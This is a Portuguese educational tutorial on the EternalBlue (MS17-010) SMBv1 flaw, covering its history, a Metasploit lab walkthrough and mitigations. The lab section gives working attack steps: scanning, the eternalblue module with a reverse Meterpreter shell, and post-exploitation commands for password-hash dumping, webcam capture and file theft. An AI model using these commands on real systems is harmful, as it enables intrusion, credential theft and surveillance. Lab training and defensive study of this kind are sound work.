## Manual Completo sobre o EternalBlue (MS17-010)

### Parte 1: Compreendendo o EternalBlue (A Teoria)

#### 1.1. O que é o EternalBlue?

EternalBlue é o codinome de um exploit (uma ferramenta que tira proveito de uma vulnerabilidade) desenvolvido pela Agência de Segurança Nacional dos Estados Unidos (NSA) . Ele mira uma falha grave no protocolo **SMBv1 (Server Message Block versão 1)** da Microsoft.

Em 2017, um grupo de hackers chamado **Shadow Brokers** vazou o exploit publicamente . Pouco tempo depois, ele foi usado como arma nos ataques de ransomware **WannaCry** e **NotPetya**, que paralisaram centenas de milhares de computadores em mais de 150 países, causando bilhões de dólares em prejuízos .

#### 1.2. Detalhes Técnicos da Vulnerabilidade (CVE-2017-0144)

- **Nome da Falha:** MS17-010 (código do boletim de segurança da Microsoft) .
- **CVE:** CVE-2017-0144 .
- **Protocolo Afetado:** SMBv1. Este protocolo é usado para compartilhamento de arquivos e impressoras em uma rede .
- **Tipo de Vulnerabilidade:** **Buffer Overflow** (estouro de buffer). O exploit envia pacotes especialmente criados para o serviço SMB da máquina alvo. Devido a uma falha na forma como o Windows lida com esses pacotes, é possível corromper a memória do sistema e executar código malicioso à distância .
- **Impacto:** **Execução Remota de Código (RCE)** . Um atacante pode comprometer o sistema completamente sem precisar de credenciais de usuário .
- **Sistemas Afetados:** Versões antigas do Windows que não possuem o patch de segurança, incluindo Windows XP, Vista, 7, Windows Server 2008 e 2008 R2 .

#### 1.3. Por que ele é tão perigoso (Wormable)?

O EternalBlue é considerado uma vulnerabilidade **"wormable"** (com capacidade de propagação similar a um worm) . Isso significa que, uma vez que uma máquina é infectada, o malware pode usar o mesmo exploit para se propagar automaticamente para outras máquinas vulneráveis na mesma rede, sem qualquer interação do usuário. Foi isso que fez o WannaCry se espalhar tão rapidamente pelo mundo .

---

### Parte 2: Explorando o EternalBlue em Laboratório (A Prática)

**⚠️ AVISO DE RESPONSABILIDADE ⚠️**
**Esta seção é apenas para fins educacionais e deve ser replicada estritamente em um ambiente de laboratório controlado, com máquinas virtuais e redes isoladas, sobre as quais você tenha propriedade ou permissão explícita para testar. O uso não autorizado destas técnicas é ilegal e constitui crime (de acordo com leis como o Computer Fraud and Abuse Act e o Código Penal Brasileiro - Art. 154-A) .**

#### 2.1. Configuração do Ambiente de Laboratório

1.  **Máquina do Atacante:** Uma máquina virtual com **Kali Linux** (que já vem com o Metasploit Framework instalado) .
2.  **Máquina Alvo (Vítima):** Uma máquina virtual com um sistema Windows vulnerável, como o **Windows 7 SP1** (sem as atualizações de segurança) ou **Windows Server 2008** . **Nunca use um sistema pessoal ou de terceiros.**
3.  **Rede:** Ambas as VMs devem estar na mesma rede (ex: modo NAT ou Host-Only no VMware/VirtualBox) e conseguir se comunicar (teste com `ping`) .

#### 2.2. Passo a Passo da Exploração com Metasploit

A maneira mais comum e didática de explorar o EternalBlue é usando o Metasploit Framework no Kali Linux.

**Passo 1: Escaneamento e Identificação**
O primeiro passo é identificar o alvo e verificar se ele é vulnerável.

- **Com Nmap:** Use o Nmap para escanear a máquina alvo e verificar se a porta 445 (SMB) está aberta .
    ```bash
    nmap -p 445 <IP_DA_VITIMA>
    ```
- **Com Script do Nmap:** Para uma verificação mais específica, use o script que testa a vulnerabilidade .
    ```bash
    nmap -p 445 --script smb-vuln-ms17-010 <IP_DA_VITIMA>
    ```
    Se a máquina for vulnerável, a saída do script indicará "VULNERABLE".

**Passo 2: Iniciando o Metasploit e Escaneando**
Abra o terminal no Kali e inicie o Metasploit.
```bash
msfconsole
```
Dentro do Metasploit, procure e use o módulo auxiliar de escaneamento para confirmar a vulnerabilidade .
```bash
search ms17-010
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS <IP_DA_VITIMA>
run
```
Se o alvo for vulnerável, a saída mostrará `Host is likely VULNERABLE to MS17-010`.

**Passo 3: Configurando o Exploit**
Com a vulnerabilidade confirmada, selecione o módulo de exploit .
```bash
use exploit/windows/smb/ms17_010_eternalblue
```
Agora, visualize e configure as opções necessárias .
```bash
show options
set RHOSTS <IP_DA_VITIMA>         # IP da máquina Windows
set LHOST <IP_DO_KALI>            # Seu IP (para o payload reverso)
set LPORT 4444                    # Porta que você vai escutar (padrão 4444)
```
Por fim, defina o payload. O mais comum é o Meterpreter reverso, que dá um poderoso shell interativo .
```bash
set payload windows/x64/meterpreter/reverse_tcp
```
**Passo 4: Executando o Ataque**
Com tudo configurado, execute o exploit .
```bash
exploit
```
Se tudo correr bem, você verá uma mensagem de sucesso (muitas vezes com um "WIN!") e o prompt mudará para `meterpreter >`.

#### 2.3. Pós-Exploração com Meterpreter

Com acesso ao Meterpreter, você tem controle total sobre o sistema da vítima com privilégios de **SYSTEM** (o nível mais alto no Windows) .

Aqui estão alguns comandos úteis de pós-exploração:

- `sysinfo`: Exibe informações detalhadas do sistema alvo .
- `getuid`: Mostra o usuário que você é no sistema alvo (deve ser `NT AUTHORITY\SYSTEM`) .
- `ps`: Lista todos os processos em execução .
- `migrate <PID>`: Move a sessão do Meterpreter para um processo mais estável (como `explorer.exe` ou `svchost.exe`) .
- `hashdump`: Extrai os hashes das senhas dos usuários do banco de dados SAM .
- `screenshot`: Captura um print da área de trabalho da vítima .
- `webcam_snap`: Tira uma foto usando a webcam da vítima .
- `shell`: Abre um shell de comando tradicional do Windows (CMD) .
- `upload /caminho/do/arquivo C:\\caminho\\destino`: Envia um arquivo da sua máquina para a vítima .
- `download C:\\caminho\\do\\arquivo /caminho/destino`: Baixa um arquivo da vítima para sua máquina .

---

### Parte 3: Mitigação e Defesa (A Proteção)

Compreender o ataque é fundamental para se defender. Aqui estão as principais medidas para proteger sistemas contra o EternalBlue e exploits semelhantes.

#### 3.1. Aplicação de Patches (A Solução Definitiva)

A Microsoft lançou o patch de segurança **MS17-010** em março de **2017** .
- **Ação:** Mantenha todos os sistemas operacionais e softwares sempre atualizados. Ative as atualizações automáticas do Windows .
- **Verificação:** Para verificar se o patch foi instalado, você pode executar o seguinte comando no PowerShell ou CMD da máquina Windows :
    ```bash
    wmic qfe get HotFixID | findstr KB4012212
    ```
    Se o comando não retornar nada, o patch `KB4012212` não está instalado.

#### 3.2. Desabilitar o SMBv1

O SMBv1 é um protocolo legado e inseguro. A melhor prática é desativá-lo, a menos que haja uma necessidade extrema de compatibilidade com sistemas muito antigos .
- **Como Desabilitar (no Windows 7/8/10/Server):**
    - Acesse **Painel de Controle > Programas e Recursos > Ativar ou desativar recursos do Windows**.
    - Desmarque a opção **"Suporte a Compartilhamento de Arquivos SMB 1.0/CIFS"** e reinicie o computador.
- **Verificação via PowerShell:** Para verificar se o SMBv1 está ativo, você pode usar :
    ```powershell
    Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" -Name SMB1
    ```
    Se o valor `SMB1` for `1`, ele está ativo. Se for `0`, está desativado.

#### 3.3. Segmentação de Rede e Firewalls

- **Firewall:** Bloqueie a porta **445 (SMB)** no firewall de borda da rede para evitar que ataques externos alcancem os computadores internos .
- **Segmentação:** Isole sistemas mais antigos e críticos em suas próprias redes (VLANs) para que, se um for comprometido, o atacante não consiga se mover lateralmente para outras partes da rede .

#### 3.4. Soluções de Segurança

- **Antivírus e EDR:** Utilize soluções de segurança modernas (Antivírus, EDR - Endpoint Detection and Response) que possam detectar e bloquear comportamentos anômalos, como as tentativas de exploração do SMB e as ferramentas de pós-exploração .
